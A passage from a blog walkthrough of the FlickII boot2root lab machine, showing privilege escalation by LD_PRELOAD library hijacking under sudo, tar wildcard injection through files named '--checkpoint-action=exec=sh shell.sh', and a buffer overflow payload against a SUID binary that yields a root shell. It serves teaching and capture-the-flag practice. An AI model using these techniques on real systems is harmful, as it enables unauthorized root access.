    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", env_keep+=LD_PRELOAD,
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User robin may run the following commands on this host:
    (bryan) /usr/local/bin/dice
</code></pre></div>
<p>Let us put all the pieces together. We can run the program as bryan, we now that
the program load the <code>LD_PRELOAD</code> environement variable.</p>
<p>A simple google search lead us to
<a href="http://jvns.ca/blog/2014/11/27/ld-preload-is-super-fun-and-easy/">this article</a>
and
<a href="https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/">this one</a>.
So now we just need to write a shared library to replace <code>rand()</code> by <code>/bin/bash</code>
run the program as bryan and we would get a shell as bryan.</p>
<p>When testing the trick I ran into the following error:</p>
<div class="highlight"><pre><span></span><code>[robin@fII ~]$ gcc -shared -fPIC unrandom.c -o unrandom.so
gcc: error trying to exec 'cc1': execvp: No such file or directory
</code></pre></div>
<p>We just need to add some variable to our user's PATH:</p>
<div class="highlight"><pre><span></span><code>export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/game
</code></pre></div>
<p>From there we we can compile the shared library and execute the dice program
with it:</p>
<div class="highlight"><pre><span></span><code>[robin@fII ~]$ gcc -shared -fPIC unrandom.c -o unrandom.so
gcc -shared -fPIC unrandom.c -o unrandom.so
[robin@fII ~]$ LD_PRELOAD=$PWD/unrandom.so /usr/local/bin/dice
LD_PRELOAD=$PWD/unrandom.so /usr/local/bin/dice
42 baby
</code></pre></div>
<p>We need to copy the <code>.so</code> to a location where bryan could read it like <code>/tmp/</code>.
Now we can run the program as bryan and load the shared library:</p>
<div class="highlight"><pre><span></span><code>sudo -u bryan LD_PRELOAD=/tmp/unrandom.so /usr/local/bin/dice
[sudo] password for robin: 40373df4b7a1f413af61cf7fd06d03a565a51898

42 baby!
</code></pre></div>
<p>We need to modify the code to get a shell:</p>
<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>

<span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="nf">getenv</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">name</span><span class="p">){</span>
<span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">rand</span><span class="p">(){</span>
<span class="n">system</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">);</span>
<span class="k">return</span><span class="w"> </span><span class="mi">42</span><span class="p">;</span><span class="w"> </span><span class="c1">//the most random number in the universe</span>
<span class="p">}</span>
</code></pre></div>
<p>We compile it with <code>gcc</code> and run it as bryan:</p>
<div class="highlight"><pre><span></span><code>[robin@fII ~]$ sudo -u bryan LD_PRELOAD=/tmp/lol.so /usr/local/bin/dice
sudo -u bryan LD_PRELOAD=/tmp/lol.so /usr/local/bin/dice
[sudo] password for robin: 40373df4b7a1f413af61cf7fd06d03a565a51898
[bryan@fII robin]$ id
id
uid=1001(bryan) gid=1001(bryan) groups=1001(bryan)
</code></pre></div>
<h3>sean</h3>
<p>Now that we have a shell as bryan we may execute the <code>backup</code> script own by
sean with the SUID set:</p>
<div class="highlight"><pre><span></span><code>[bryan@fII bin]$ ls -al
ls -al
total 1960
drwxr-xr-x.  2 root root       59 Aug 17  2015 .
drwxr-xr-x. 12 root root     4096 Jun 22  2015 ..
-rwsr-x---.  1 sean bryan    8830 Jul  2  2015 backup
-rwxr-xr-x.  1 root root  1107672 Jun 22  2015 composer
-rwx--x--x.  1 root root     8830 Jul  2  2015 dice
-rwsr-x---   1 root sean   866169 Aug 15  2015 restore
</code></pre></div>
<p>Let us see what it does:</p>
<div class="highlight"><pre><span></span><code>[bryan@fII bin]$ ./backup
./backup
* Securing environment
* Performing database backup...
app/
app/.gitignore
database.sqlite
framework/
framework/cache/
framework/cache/.gitignore
framework/sessions/
framework/sessions/.gitignore
framework/views/
framework/views/.gitignore
logs/
logs/.gitignore
logs/lumen.log
* Backup done!
</code></pre></div>
<p>It might be something about WildCards on linux.
Let us see what is used by the backup program with <code>strace</code> which available on
the server let us try it to see the inside of the program:</p>
<div class="highlight"><pre><span></span><code>[sean@fII bin]$ strace -s 999 -v -f ./backup 2&gt;&amp;1 | grep execve
strace -s 999 -v -f ./backup 2&gt;&amp;1 | grep execve
execve("./backup", ["./backup"], ["TAR_SUBCOMMAND=-c", "TAR_FORMAT=gnu", "TERM=unknown", "SHELL=/bin/bash", "USER=bryan", "TAR_BLOCKING_FACTOR=20", "LS_COLORS=", "SUDO_USER=robin", "SUDO_UID=1000", "USERNAME=bryan", "PATH=/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin", "MAIL=/var/mail/bryan", "PWD=/usr/local/bin", "LANG=en_US.UTF-8", "TAR_ARCHIVE=/home/sean/backup_20160312.tar.gz", "TAR_CHECKPOINT=1", "SHLVL=13", "SUDO_COMMAND=/usr/local/bin/dice", "HOME=/home/bryan", "LOGNAME=bryan", "TAR_VERSION=1.26", "LESSOPEN=||/usr/bin/lesspipe.sh %s", "SUDO_GID=1000", "_=/bin/strace", "OLDPWD=/tmp"]) = 0
[pid  1779] execve("/bin/sh", ["sh", "-c", "PATH=/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin; cd /usr/share/nginx/serverchecker/storage; /bin/tar -zvcf /home/sean/backup_$(/bin/date +\"%Y%m%d\").tar.gz *;"], ["TAR_SUBCOMMAND=-c", "TAR_FORMAT=gnu", "TERM=unknown", "SHELL=/bin/bash", "USER=bryan", "TAR_BLOCKING_FACTOR=20", "LS_COLORS=", "SUDO_USER=robin", "SUDO_UID=1000", "USERNAME=bryan", "PATH=/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin", "MAIL=/var/mail/bryan", "PWD=/usr/local/bin", "LANG=en_US.UTF-8", "TAR_ARCHIVE=/home/sean/backup_20160312.tar.gz", "TAR_CHECKPOINT=1", "SHLVL=13", "SUDO_COMMAND=/usr/local/bin/dice", "HOME=/home/bryan", "LOGNAME=bryan", "TAR_VERSION=1.26", "LESSOPEN=||/usr/bin/lesspipe.sh %s", "SUDO_GID=1000", "_=/bin/strace", "OLDPWD=/tmp"]) = 0
[pid  1781] execve("/bin/date", ["/bin/date", "+%Y%m%d"], ["TAR_FORMAT=gnu", "TAR_SUBCOMMAND=-c", "SHELL=/bin/bash", "TERM=unknown", "OLDPWD=/usr/local/bin", "TAR_BLOCKING_FACTOR=20", "USER=bryan", "LS_COLORS=", "SUDO_USER=robin", "SUDO_UID=1000", "USERNAME=bryan", "MAIL=/var/mail/bryan", "PATH=/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin", "PWD=/usr/share/nginx/serverchecker/storage", "LANG=en_US.UTF-8", "TAR_CHECKPOINT=1", "TAR_ARCHIVE=/home/sean/backup_20160312.tar.gz", "HOME=/home/bryan", "SUDO_COMMAND=/usr/local/bin/dice", "SHLVL=14", "LOGNAME=bryan", "TAR_VERSION=1.26", "LESSOPEN=||/usr/bin/lesspipe.sh %s", "SUDO_GID=1000", "_=/bin/date"]) = 0
[pid  1782] execve("/bin/tar", ["/bin/tar", "-zvcf", "/home/sean/backup_20160312.tar.gz", "app", "--checkpoint-action=exec=sh shell.sh", "database.sqlite", "framework", "logs", "shell.sh"], ["TAR_FORMAT=gnu", "TAR_SUBCOMMAND=-c", "SHELL=/bin/bash", "TERM=unknown", "OLDPWD=/usr/local/bin", "TAR_BLOCKING_FACTOR=20", "USER=bryan", "LS_COLORS=", "SUDO_USER=robin", "SUDO_UID=1000", "USERNAME=bryan", "MAIL=/var/mail/bryan", "PATH=/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin", "PWD=/usr/share/nginx/serverchecker/storage", "LANG=en_US.UTF-8", "TAR_CHECKPOINT=1", "TAR_ARCHIVE=/home/sean/backup_20160312.tar.gz", "HOME=/home/bryan", "SUDO_COMMAND=/usr/local/bin/dice", "SHLVL=14", "LOGNAME=bryan", "TAR_VERSION=1.26", "LESSOPEN=||/usr/bin/lesspipe.sh %s", "SUDO_GID=1000", "_=/bin/tar"]) = 0
[pid  1783] execve("/usr/local/bin/gzip", ["gzip"], ["TAR_FORMAT=gnu", "TAR_SUBCOMMAND=-c", "SHELL=/bin/bash", "TERM=unknown", "OLDPWD=/usr/local/bin", "TAR_BLOCKING_FACTOR=20", "USER=bryan", "LS_COLORS=", "SUDO_USER=robin", "SUDO_UID=1000", "USERNAME=bryan", "MAIL=/var/mail/bryan", "PATH=/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin", "PWD=/usr/share/nginx/serverchecker/storage", "LANG=en_US.UTF-8", "TAR_CHECKPOINT=1", "TAR_ARCHIVE=/home/sean/backup_20160312.tar.gz", "HOME=/home/bryan", "SUDO_COMMAND=/usr/local/bin/dice", "SHLVL=14", "LOGNAME=bryan", "TAR_VERSION=1.26", "LESSOPEN=||/usr/bin/lesspipe.sh %s", "SUDO_GID=1000", "_=/bin/tar"]) = -1 ENOENT (No such file or directory)
[pid  1783] execve("/bin/gzip", ["gzip"], ["TAR_FORMAT=gnu", "TAR_SUBCOMMAND=-c", "SHELL=/bin/bash", "TERM=unknown", "OLDPWD=/usr/local/bin", "TAR_BLOCKING_FACTOR=20", "USER=bryan", "LS_COLORS=", "SUDO_USER=robin", "SUDO_UID=1000", "USERNAME=bryan", "MAIL=/var/mail/bryan", "PATH=/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin", "PWD=/usr/share/nginx/serverchecker/storage", "LANG=en_US.UTF-8", "TAR_CHECKPOINT=1", "TAR_ARCHIVE=/home/sean/backup_20160312.tar.gz", "HOME=/home/bryan", "SUDO_COMMAND=/usr/local/bin/dice", "SHLVL=14", "LOGNAME=bryan", "TAR_VERSION=1.26", "LESSOPEN=||/usr/bin/lesspipe.sh %s", "SUDO_GID=1000", "_=/bin/tar"]) = 0
</code></pre></div>
<ul>
<li>The <code>-s 999</code> allows to specify the maximum string size to print</li>
<li>the -v prints more informations</li>
<li>the -f see the child process calls, you would not see a lot of things without
  this flag</li>
</ul>
<p>We can see that the <code>tar</code> utility is used. We have seen in the previous link
that we can exploit it using the <code>checkpoint</code>. The backup directory is
<code>/usr/share/nginx/serverchecker/storage</code>.</p>
<div class="highlight"><pre><span></span><code>[bryan@fII bin]$ touch '/usr/share/nginx/serverchecker/storage/--checkpoint=1'
[bryan@fII bin]$ touch '/usr/share/nginx/serverchecker/storage/--checkpoint-action=exec=sh shell.sh'
[bryan@fII bin]$ echo '/bin/sh' &gt; /usr/share/nginx/serverchecker/storage/shell.sh
[bryan@fII bin]$ chmod +x /usr/share/nginx/serverchecker/storage/shell.sh
[bryan@fII bin]$ ls -al /usr/share/nginx/serverchecker/storage/
total 20
drwxrwxrwx.  5 nginx nginx 4096 Mar 12 11:54 .
drwxr-xr-x. 10 nginx nginx 4096 Jun 22  2015 ..
drwxr-xr-x.  2 nginx nginx   23 Jun 22  2015 app
-rw-rw-r--   1 bryan bryan    0 Mar 12 11:52 --checkpoint=1
-rw-rw-r--   1 bryan bryan    0 Mar 12 11:53 --checkpoint-action=exec=sh shell.sh
-rwxrwxrwx.  1 nginx nginx 6144 Feb 14 14:40 database.sqlite
drwxr-xr-x.  5 nginx nginx   45 Jun 22  2015 framework
drwxr-xr-x.  2 nginx nginx   39 Jun 22  2015 logs
-rw-rw-r--   1 bryan bryan    8 Mar 12 11:54 shell.s
</code></pre></div>
<p>We launch the backup program:</p>
<div class="highlight"><pre><span></span><code>[bryan@fII bin]$ /usr/local/bin/backup
sh-4.2$ id
id
uid=1002(sean) gid=1001(bryan) groups=1002(sean),1001(bryan)
</code></pre></div>
<h3>root me?</h3>
<p>Let get us back a real shell:</p>
<div class="highlight"><pre><span></span><code>python -c 'import pty; pty.spawn("/bin/bash")'
</code></pre></div>
<p>You may need to change the permission of bryan's <code>.bashrc</code> as you can get an
error about it:</p>
<div class="highlight"><pre><span></span><code>[bryan@fII ~]$ chmod 777 ~/.*
</code></pre></div>
<p>(Yes I had to exit the shell and start again the operations :/)</p>
<p>Next we need to use the <code>restore</code> program also in <code>/usr/local/bin/</code> own by root
with the SUID set and executable by the <code>sean</code> group. First we need to change
our group (as the one used is <code>bryan</code>).</p>
<div class="highlight"><pre><span></span><code>newgrp sean
</code></pre></div>
<p>Let us try the program by creating and empty archive in <code>/tmp/</code>:</p>
<div class="highlight"><pre><span></span><code>[sean@fII storage]$ cd /tmp/
[sean@fII tmp]$ touch backup.tar.gz
[sean@fII tmp]$ cd /usr/local/bin
[sean@fII bin]$ ./restore
Restore tool v0.1
Enter the path to the backup.tar.gz: /tmp/
Path is: /tmp/
Enter the output directory: /tmp/
Output directory is: /tmp/
This is a beta, run the following command for now:
/bin/sh -c "/usr/bin/tar xf /tmp/backup.tar.gz -C /tmp/ database.sqlite"
You are currently running this tool as:
uid=0(root) gid=0(root) groups=0(root),1001(bryan),1002(sean)
</code></pre></div>
<p>This looks like we would have to use a buffer overflow the get a root shell as
the program segfault when the input for the "output directory" is too long:</p>
<div class="highlight"><pre><span></span><code>[sean@fII tmp]$ /usr/local/bin/restore
/usr/local/bin/restore
Restore tool v0.1
Enter the path to the backup.tar.gz: /tmp/
/tmp/
Path is: /tmp/
Enter the output directory: qwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklqwertyuiopasdfghjklzxcvbnmqwertyuiop
qwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklqwertyuiopasdfghjklzxcvbnmqwertyuiop
Output directory is: qwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklqwertyuiopasdfghjklzxcvbnmqwertyuiop
Segmentation fault
</code></pre></div>
<p>Let us used objdump to see what we can do and to which address get back in the
program:</p>
<div class="highlight"><pre><span></span><code>objdump -d ./restore
[...]
0000000000400fe1 &lt;get_out_path&gt;:
  400fe1:   55                      push   %rbp
  400fe2:   48 89 e5                mov    %rsp,%rbp
  400fe5:   48 83 ec 40             sub    $0x40,%rsp
  400fe9:   bf 77 2b 49 00          mov    $0x492b77,%edi
  400fee:   b8 00 00 00 00          mov    $0x0,%eax
  400ff3:   e8 38 11 00 00          callq  402130 &lt;_IO_printf&gt;
  400ff8:   48 8d 45 c0             lea    -0x40(%rbp),%rax
  400ffc:   48 89 c7                mov    %rax,%rdi
  400fff:   e8 2c 15 00 00          callq  402530 &lt;_IO_gets&gt;
  401004:   48 8d 45 c0             lea    -0x40(%rbp),%rax
  401008:   48 89 c6                mov    %rax,%rsi
  40100b:   bf 94 2b 49 00          mov    $0x492b94,%edi
  401010:   b8 00 00 00 00          mov    $0x0,%eax
  401015:   e8 16 11 00 00          callq  402130 &lt;_IO_printf&gt;
  40101a:   48 8d 45 c0             lea    -0x40(%rbp),%rax
  40101e:   c9                      leaveq
  40101f:   c3                      retq
</code></pre></div>
<p>It looks like the address <code>401f71</code> would give us a shell if we return there with
the buffer overflow.</p>
<div class="highlight"><pre><span></span><code>objdump -d ./restore
[...]
  401f15:   eb 93                   jmp    401eaa &lt;do_system+0x29a&gt;
  401f17:   31 d2                   xor    %edx,%edx
  401f19:   be 00 f5 6b 00          mov    $0x6bf500,%esi
  401f1e:   bf 02 00 00 00          mov    $0x2,%edi
  401f23:   48 c7 44 24 30 25 2d    movq   $0x492d25,0x30(%rsp)
  401f2a:   49 00
  401f2c:   48 c7 44 24 38 1d 2d    movq   $0x492d1d,0x38(%rsp)
  401f33:   49 00
  401f35:   48 89 6c 24 40          mov    %rbp,0x40(%rsp)
  401f3a:   48 c7 44 24 48 00 00    movq   $0x0,0x48(%rsp)
  401f41:   00 00
  401f43:   e8 b8 e2 01 00          callq  420200 &lt;__sigaction&gt;
  401f48:   31 d2                   xor    %edx,%edx
  401f4a:   be 60 f4 6b 00          mov    $0x6bf460,%esi
  401f4f:   bf 03 00 00 00          mov    $0x3,%edi
  401f54:   e8 a7 e2 01 00          callq  420200 &lt;__sigaction&gt;
  401f59:   48 8d 74 24 50          lea    0x50(%rsp),%rsi
  401f5e:   31 d2                   xor    %edx,%edx
  401f60:   bf 02 00 00 00          mov    $0x2,%edi
  401f65:   e8 b6 e2 01 00          callq  420220 &lt;__sigprocmask&gt;
  401f6a:   48 8b 15 ff d7 2b 00    mov    0x2bd7ff(%rip),%rdx        # 6bf770 &lt;__environ&gt;
  401f71:   48 8d 74 24 30          lea    0x30(%rsp),%rsi
  401f76:   bf 20 2d 49 00          mov    $0x492d20,%edi
  401f7b:   c7 05 bb d4 2b 00 00    movl   $0x0,0x2bd4bb(%rip)        # 6bf440 &lt;lock&gt;
  401f82:   00 00 00
  401f85:   c7 05 c1 d4 2b 00 00    movl   $0x0,0x2bd4c1(%rip)        # 6bf450 &lt;sa_refcntr&gt;
  401f8c:   00 00 00
  401f8f:   e8 9c aa 01 00          callq  41ca30 &lt;__execve&gt;
  401f94:   bf 7f 00 00 00          mov    $0x7f,%edi
  401f99:   e8 32 aa 01 00          callq  41c9d0 &lt;_exit&gt;
  401f9e:   48 c7 c2 c0 ff ff ff    mov    $0xffffffffffffffc0,%rdx
  401fa5:   f7 d8                   neg    %eax
</code></pre></div>
<p>Let us use python to generate the payload encoded in little endian:</p>
<div class="highlight"><pre><span></span><code>[sean@fII storage]$ python -c 'print "A"*72 + "\x71\x1f\x40"'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAq
</code></pre></div>
<p>You may need to use another terminal which would not mess up with your input as
urxvt did. I used tilda for this one. We just need to copy the payload when
choosing the output directory for the restore program:</p>
<div class="highlight"><pre><span></span><code>[sean@fII storage]$ /usr/local/bin/restore
/usr/local/bin/restore
Restore tool v0.1
Enter the path to the backup.tar.gz: /tmp/
/tmp/
Path is: /tmp/
Enter the output directory: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAq
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAq
Output directory is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</code></pre></div>
<p>And it got us a root shell from where we can get the flag:</p>
<div class="highlight"><pre><span></span><code><span class="o">[</span><span class="n">root@fII storage</span><span class="o">]</span><span class="err">#</span><span class="w"> </span><span class="n">id</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"> </span><span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">),</span><span class="mi">1001</span><span class="p">(</span><span class="n">bryan</span><span class="p">),</span><span class="mi">1002</span><span class="p">(</span><span class="n">sean</span><span class="p">)</span>

<span class="n">root</span><span class="nv">@fII</span><span class="w"> </span><span class="n">root</span><span class="err">]#</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">flag</span>

<span class="w">  </span><span class="err">█████▒██▓</span><span class="w">     </span><span class="err">██▓</span><span class="w"> </span><span class="err">▄████▄</span><span class="w">   </span><span class="err">██</span><span class="w"> </span><span class="err">▄█▀</span><span class="w"> </span><span class="err">██▓</span><span class="w"> </span><span class="err">██▓</span>
<span class="err">▓██</span><span class="w">   </span><span class="err">▒▓██▒</span><span class="w">    </span><span class="err">▓██▒▒██▀</span><span class="w"> </span><span class="err">▀█</span><span class="w">   </span><span class="err">██▄█▒</span><span class="w"> </span><span class="err">▓██▒▓██▒</span>
<span class="err">▒████</span><span class="w"> </span><span class="err">░▒██░</span><span class="w">    </span><span class="err">▒██▒▒▓█</span><span class="w">    </span><span class="err">▄</span><span class="w"> </span><span class="err">▓███▄░</span><span class="w"> </span><span class="err">▒██▒▒██▒</span>
<span class="err">░▓█▒</span><span class="w">  </span><span class="err">░▒██░</span><span class="w">    </span><span class="err">░██░▒▓▓▄</span><span class="w"> </span><span class="err">▄██▒▓██</span><span class="w"> </span><span class="err">█▄</span><span class="w"> </span><span class="err">░██░░██░</span>
<span class="err">░▒█░</span><span class="w">   </span><span class="err">░██████▒░██░▒</span><span class="w"> </span><span class="err">▓███▀</span><span class="w"> </span><span class="err">░▒██▒</span><span class="w"> </span><span class="err">█▄░██░░██░</span>
<span class="err">▒</span><span class="w"> </span><span class="err">░</span><span class="w">   </span><span class="err">░</span><span class="w"> </span><span class="err">▒░▓</span><span class="w">  </span><span class="err">░░▓</span><span class="w">  </span><span class="err">░</span><span class="w"> </span><span class="err">░▒</span><span class="w"> </span><span class="err">▒</span><span class="w">  </span><span class="err">░▒</span><span class="w"> </span><span class="err">▒▒</span><span class="w"> </span><span class="err">▓▒░▓</span><span class="w">  </span><span class="err">░▓</span>
<span class="err">░</span><span class="w">     </span><span class="err">░</span><span class="w"> </span><span class="err">░</span><span class="w"> </span><span class="err">▒</span><span class="w">  </span><span class="err">░</span><span class="w"> </span><span class="err">▒</span><span class="w"> </span><span class="err">░</span><span class="w">  </span><span class="err">░</span><span class="w">  </span><span class="err">▒</span><span class="w">   </span><span class="err">░</span><span class="w"> </span><span class="err">░▒</span><span class="w"> </span><span class="err">▒░</span><span class="w"> </span><span class="err">▒</span><span class="w"> </span><span class="err">░</span><span class="w"> </span><span class="err">▒</span><span class="w"> </span><span class="err">░</span>
<span class="err">░</span><span class="w"> </span><span class="err">░</span><span class="w">     </span><span class="err">░</span><span class="w"> </span><span class="err">░</span><span class="w">    </span><span class="err">▒</span><span class="w"> </span><span class="err">░░</span><span class="w">        </span><span class="err">░</span><span class="w"> </span><span class="err">░░</span><span class="w"> </span><span class="err">░</span><span class="w">  </span><span class="err">▒</span><span class="w"> </span><span class="err">░</span><span class="w"> </span><span class="err">▒</span><span class="w"> </span><span class="err">░</span>
<span class="w">          </span><span class="err">░</span><span class="w">  </span><span class="err">░</span><span class="w"> </span><span class="err">░</span><span class="w">  </span><span class="err">░</span><span class="w"> </span><span class="err">░</span><span class="w">      </span><span class="err">░</span><span class="w">  </span><span class="err">░</span><span class="w">    </span><span class="err">░</span><span class="w">   </span><span class="err">░</span>
<span class="w">                  </span><span class="err">░</span>

<span class="n">You</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">successfully</span><span class="w"> </span><span class="n">completed</span><span class="w"> </span><span class="n">FlickII</span><span class="err">!</span>

<span class="n">I</span><span class="w"> </span><span class="n">hope</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">learnt</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">much</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">did</span><span class="w"> </span><span class="k">while</span>
<span class="n">making</span><span class="w"> </span><span class="n">it</span><span class="err">!</span><span class="w"> </span><span class="ow">Any</span><span class="w"> </span><span class="n">comments</span><span class="o">/</span><span class="n">suggestions</span><span class="w"> </span><span class="n">etc</span><span class="p">,</span>
<span class="n">feel</span><span class="w"> </span><span class="k">free</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="n">me</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">freenode</span><span class="w"> </span><span class="ow">in</span>
<span class="n">#vulnhub</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">twitter</span><span class="w"> </span><span class="nv">@leonjza</span>
</code></pre></div>
<h2>Conclusion</h2>
<p>This was a really great challange! The android part was a really new to me. The
exploitation part was very interesting!.</p>
<p>Many thanks to TurboSmouem for the challange and as usual thanks to vulnhub.</p>
</div>
<div class="tag-cloud">
<p>
<a href="../../tag/security.html">security</a>
<a href="../../tag/vulnhub.html">vulnhub</a>
<a href="../../tag/challenge.html">challenge</a>
<a href="../../tag/boot2root.html">boot2root</a>
<a href="../../tag/linux.html">linux</a>
</p>
</div>
<div class="neighbors">
<a class="btn float-left" href="../../2016/02/auditing-exchange-server.html" title="Auditing Exchange Server">
<i class="fa fa-angle-left"></i> Previous Post
    </a>
<a class="btn float-right" href="../../2016/04/installing-osmc-without-installer.html" title="Installing OSMC without installer">
      Next Post <i class="fa fa-angle-right"></i>
</a>
</div>
</article>
<footer>
<p>
  © 2023  - This work is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/deed.en_US" rel="license" target="_blank">Creative Commons Attribution</a>
</p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script data-default-theme="light" data-enable-auto-detect-theme="True" id="dark-theme-script" src="../../theme/dark-theme/dark-theme.min.js" type="text/javascript">
</script>
</p><p>
<a href="http://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">
<img alt="Creative Commons License" height="15" src="https://i.creativecommons.org/l/by/4.0/80x15.png" style="border-width:0" title="Creative Commons License" width="80">
</img></a>
</p></footer> </main>
<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " maggick's logs ",
  "url" : "../..",
  "image": "https://maggick.fr/media/image.png",
  "description": ""
}
</script>
</body>
</html>